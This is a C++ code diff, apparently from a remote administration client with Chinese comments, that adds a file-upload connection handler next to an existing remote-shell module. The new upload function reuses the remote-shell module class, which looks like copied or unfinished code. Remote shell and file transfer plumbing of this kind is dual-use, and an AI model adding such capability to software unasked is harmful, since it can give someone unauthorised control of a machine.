@@ -58,6 +58,10 @@ BOOL CModuleManage::OnReceiveConnectPacket(CPacket* pPacket) {
 		m_ahThread[m_dwThreadNum++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleShellRemote, (LPVOID)pPacketCopy, 0, NULL);
 		break;
 
+	case FILE_UPLOAD_CONNECT:
+		m_ahThread[m_dwThreadNum++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleFileUpload, (LPVOID)pPacketCopy, 0, NULL);
+		break;
+
 	default:
 		//pPacket->
 
@@ -98,6 +102,32 @@ DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
 	}
 
 	Sleep(500);
-	printf("退出线程\n");
+	printf("退出RunModuleShellRemote线程\n");
+	return 0;
+}
+
+
+
+DWORD WINAPI RunModuleFileUpload(CPacket* pPacket) {
+	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
+	CModuleShellRemote* pModule = new CModuleShellRemote(pChildSocketClient);			// 在这里面给pChildSocketClient->m_pModule赋值
+
+	pChildSocketClient->StartSocketClient();
+	pChildSocketClient->SendPacket(FILE_UPLOAD_CONNECT, NULL, 0);
+
+	pChildSocketClient->WaitForExitEvent();
+
+	if (pChildSocketClient != nullptr) {
+		delete pChildSocketClient;
+		pChildSocketClient = nullptr;
+	}
+
+	if (pPacket != nullptr) {
+		delete pPacket;
+		pPacket = nullptr;
+	}
+
+	Sleep(500);
+	printf("退出RunModuleFileUpload线程\n");
 	return 0;
 }
